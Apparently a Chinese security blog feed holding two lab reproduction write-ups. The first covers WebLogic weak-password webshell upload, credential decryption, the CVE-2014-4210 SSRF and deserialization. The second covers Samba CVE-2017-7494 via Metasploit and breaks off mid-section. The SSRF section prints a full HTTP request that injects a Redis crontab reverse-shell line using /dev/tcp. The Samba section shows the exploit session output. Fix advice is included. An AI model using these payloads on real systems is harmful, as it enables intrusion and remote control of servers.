        <content type="html"><![CDATA[<h3 id="0x00-WebLogic-介绍及常见漏洞"><a href="#0x00-WebLogic-介绍及常见漏洞" class="headerlink" title="0x00 WebLogic 介绍及常见漏洞"></a>0x00 WebLogic 介绍及常见漏洞</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。<br>WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址<a href="https://github.com/phith0n/vulhub/tree/master/weblogic。" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic。</a></p><a id="more"></a><h3 id="0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL"><a href="#0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL" class="headerlink" title="0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL"></a>0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL</h3><p>通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。<br>下载项目后进入到<code>/weblogic/weak_password</code>目录，运行命令<code>sudo docker-compose build</code>进行编译（请参照<a href="https://github.com/phith0n/vulhub/blob/master/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/README.md</a> 进行docker的安装）。<br>编译完成后进行启动<br>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure><p><img src="%E5%90%AF%E5%8A%A8WebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%8E%AF%E5%A2%83.png" alt="启动WebLogic弱口令环境"></p><p>Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：<a href="http://192.168.232.137:7001" target="_blank" rel="noopener">http://192.168.232.137:7001</a></p><p><img src="%E8%AE%BF%E9%97%AEWebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4web%E9%A1%B9%E7%9B%AE.png" alt="访问WebLogic弱口令web项目"></p><p>访问 <a href="http://192.168.232.137:7001/console" target="_blank" rel="noopener">http://192.168.232.137:7001/console</a> 会跳转到管理员登录页面<a href="http://192.168.232.137:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.232.137:7001/console/login/LoginForm.jsp</a></p><p>这里用户名密码分别为：weblogic/Oracle@123<br>上传war过程如下图所示<br><img src="%E4%B8%8A%E4%BC%A0war%E8%BF%87%E7%A8%8B.gif" alt="上传war过程"></p><p>总结起来就是：<code>域结构-部署-安装-上传文件-将此部署安装为应用程序</code>。然后访问项目名称即可。</p><blockquote><p>如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md</a> ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。</p></blockquote><p><strong>WebLogic加密解密方式</strong></p><p>WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：<br><code>安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p><p>例如靶机中的密码文件位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p><p>内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</span><br><span class="line">password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</span><br></pre></td></tr></table></figure><p>加密key保存在SerializedSystemIni.dat文件中。默认位置：<br><code>安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p><p>靶机中的位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p><p>采用这两个文件就可以进行解密了。<br><img src="%E8%A7%A3%E5%AF%86%E5%AF%86%E7%A0%81.png" alt="解密WebLogic密码"></p><p>WebLogic 11gR1之前的版本采用的DES加密方式。<br><code>安装目录/samples/domains/wl_server/security/boot.properties</code><br>内容格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br><span class="line">password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br></pre></td></tr></table></figure><p>采用上面的解密工具即可解密。</p><h3 id="0x02-WebLogic-SSRF漏洞"><a href="#0x02-WebLogic-SSRF漏洞" class="headerlink" title="0x02 WebLogic SSRF漏洞"></a>0x02 WebLogic SSRF漏洞</h3><p>漏洞编号：CVE-2014-4210<br>漏洞影响：<br>    版本10.0.2,10.3.6<br>    Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。<br>进入到<code>/weblogic/ssrf</code>目录，运行命令<code>sudo docker-compose build</code>进行编译。</p><blockquote><p>编译时将Dockerfile文件中的第六行<code>&amp;&amp; yum update \</code>修改为<code>&amp;&amp; yum update -y \</code>，不然会出现错误<code>ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex     &amp;&amp; yum update     &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1</code>。并且无法编译。（感谢P牛的解答）</p></blockquote><p>编译完成后进行启动<br>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure><p>![启动WebLogic SSRF环境](启动WebLogic SSRF环境.png)</p><p>利用<a href="https://github.com/fupinglee/MyPython/blob/master/weblogic/weblogic_ssrf.py" target="_blank" rel="noopener">脚本</a>扫描内网开放端口的主机。</p><p><img src="SSRF%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" alt="SSRF扫描结果"></p><p>根据<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md</a> 利用Redis反弹shell<br>在Ubuntu上执行命令<code>nc -l -p 1234</code><br>发送请求包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/<span class="built_in">test</span>%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="%E5%8F%91%E9%80%81HTTP%E8%AF%B7%E6%B1%82.png" alt="发送HTTP请求"></p><p>过一会查看Ubuntu可以看到一个shell</p><p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p><p><strong>修复建议：</strong><br>    1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。<br>    2.安装oracle的更新包。</p><h3 id="0x03-WebLogic-反序列化漏洞"><a href="#0x03-WebLogic-反序列化漏洞" class="headerlink" title="0x03 WebLogic 反序列化漏洞"></a>0x03 WebLogic 反序列化漏洞</h3><p>漏洞编号：CVE-2015-4852<br>漏洞影响：<br>    Oracle WebLogic Server 12.2.1.0<br>    Oracle WebLogic Server 12.1.3.0<br>    Oracle WebLogic Server 12.1.2.0<br>    Oracle WebLogic Server 10.3.6.0<br>    Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。</p><p>这里还以SSRF的环境为例。<br>使用WebLogic反序列化工具进行验证（作者：rebeyond)。<br><img src="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png" alt="反序列化1"></p><p>一般web项目位于<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/</code>中<br><img src="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png" alt="反序列化2"></p><p>发现没有_WL_user目录，所以把shell上传到自带的项目中。</p><p>通过执行命令<code>ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/</code><br>发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。<br>将shell文件上传到任意一个目录下的war文件即可。</p><p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt</code></p><p><img src="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6.png" alt="上传测试文件"></p><p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp</code></p><p><img src="%E4%B8%8A%E4%BC%A0webshell.png" alt="上传webshell"></p><p>也可以使用weget下载。</p><p>使用weak_password时，上传路径为</p><p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt</code></p><p><img src="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B62.png" alt="上传测试文件2"></p><blockquote><p>找WEB绝对路径的另一种方式，Linux下使用命令<code>find -name *.jsp</code>来查找，例如已知hello项目里面有个file.jsp，则查找的命令为<code>find -name file.jsp</code>。对于Windows下，使用<code>for /r c:\ %i in (file*.jsp) do @echo %i</code>，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。</p></blockquote><p><strong>linux下查找文件路径</strong></p><p><img src="%E6%89%BE%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95.png" alt="找文件目录"></p><p><strong>Windows下查找路径</strong><br><img src="Windows%E4%B8%8B%E6%9F%A5%E6%89%BE%E8%B7%AF%E5%BE%84.png" alt="Windows下查找路径"></p><p><strong>修复建议：</strong><br>    1.过滤T3协议<br>    2.安装补丁</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。<br>1.对于WebLogic弱口令，如何去上传WEBSHELL<br>2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。<br>3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p>[1]<a href="https://github.com/phith0n/vulhub/tree/master/weblogic" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic</a><br>[2]<a href="http://blog.csdn.net/chs007chs/article/details/52514888" target="_blank" rel="noopener">http://blog.csdn.net/chs007chs/article/details/52514888</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> WebLogic漏洞 </tag>
            
            <tag> WebLogic反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Samba远程代码执行漏洞(CVE-2017-7494)复现过程</title>
      <link href="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/"/>
      <url>/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。<br>这里采用ubuntu-16.04.2 x64位为测试机。</p><a id="more"></a><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h4><p>靶机中默认未安装Samba，首先来安装Samba并进行配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install samba</span><br></pre></td></tr></table></figure><p><img src="%E5%AE%89%E8%A3%85samba.png" alt="安装samba"></p><p>安装成功，查看版本</p><p><img src="%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC.png" alt="查看版本"></p><p>修改Samba配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/samba/smb.conf</span><br></pre></td></tr></table></figure><p>在最底部添加如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></span><br><span class="line">path = /tmp</span><br><span class="line">public = yes</span><br><span class="line">writeable = yes</span><br></pre></td></tr></table></figure><p><img src="%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="修改配置文件"></p><p>然后重启smbd服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service smbd restart</span><br></pre></td></tr></table></figure><p>至此，环境已经搭建成功。开始用Kail进行攻击。</p><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>首先去下载利用的脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/exploits/linux/samba</span></span><br><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba<span class="comment"># wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb</span></span><br></pre></td></tr></table></figure><p><img src="%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC.png" alt="下载脚本"></p><p>然后就是在Metasploit中加载并使用脚本，攻击过程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/linux/samba/is_known_pipename</span><br><span class="line">msf exploit(is_known_pipename) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOST                            yes       The target address</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_BASE                   no        The remote filesystem path correlating with the SMB share name</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   2   Linux x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(is_known_pipename) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   Linux ARM (LE)</span><br><span class="line">   2   Linux x86</span><br><span class="line">   3   Linux x86_64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</span><br><span class="line">RHOST =&gt; 192.168.232.137</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf exploit(is_known_pipename) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.232.134:4444</span><br><span class="line">[*] 192.168.232.137:445 - Using location \\192.168.232.137\fuping\ <span class="keyword">for</span> the path</span><br><span class="line">[*] 192.168.232.137:445 - Payload is stored <span class="keyword">in</span> //192.168.232.137/fuping/ as gRoUnyzb.so</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...</span><br><span class="line">[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...</span><br><span class="line">[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)</span><br><span class="line">whoami</span><br><span class="line">nobody</span><br><span class="line">ifconfig</span><br><span class="line">docker0   Link encap:Ethernet  HWaddr 02:42:23:77:72:91 </span><br><span class="line">          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link</span><br><span class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:180 (180.0 B)</span><br><span class="line"></span><br><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:77:23:9e </span><br><span class="line">          inet addr:192.168.232.137  Bcast:192.168.232.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:349052 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:419009840 (419.0 MB)  TX bytes:8902292 (8.9 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:23329 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1</span><br><span class="line">          RX bytes:48010585 (48.0 MB)  TX bytes:48010585 (48.0 MB)</span><br></pre></td></tr></table></figure><blockquote><p>需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。</p></blockquote><p>效果图</p><p><img src="%E8%84%9A%E6%9C%AC%E8%AF%B4%E6%98%8E.png" alt="脚本说明"></p><p><img src="%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="攻击成功"></p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><h4 id="2017-05-26-对需要登陆的Smb进行验证"><a href="#2017-05-26-对需要登陆的Smb进行验证" class="headerlink" title="2017.05.26 对需要登陆的Smb进行验证"></a>2017.05.26 对需要登陆的Smb进行验证</h4><p>脚本已经更新，集成在msf中，直接msfupdate即可。</p><p><strong>1.修改Ubuntu中的Samba配置文件。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/samba/smb.conf</span><br></pre></td></tr></table></figure><p>在<code>[global]</code>中添加：<code>security = user</code><br>修改底部的<code>[fuping]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></span><br><span class="line">path = /tmp</span><br><span class="line">writeable = yes</span><br></pre></td></tr></table></figure><p><img src="%E6%9B%B4%E6%96%B0Samba%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="更新Samba配置文件"></p><p><strong>2.添加smb用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd smbuser</span><br><span class="line">sudo smbpasswd -a smbuser</span><br></pre></td></tr></table></figure><p><img src="%E6%B7%BB%E5%8A%A0smb%E7%94%A8%E6%88%B7.png" alt="添加smb用户"></p><p><strong>3.开始攻击</strong></p><figure class="highlight 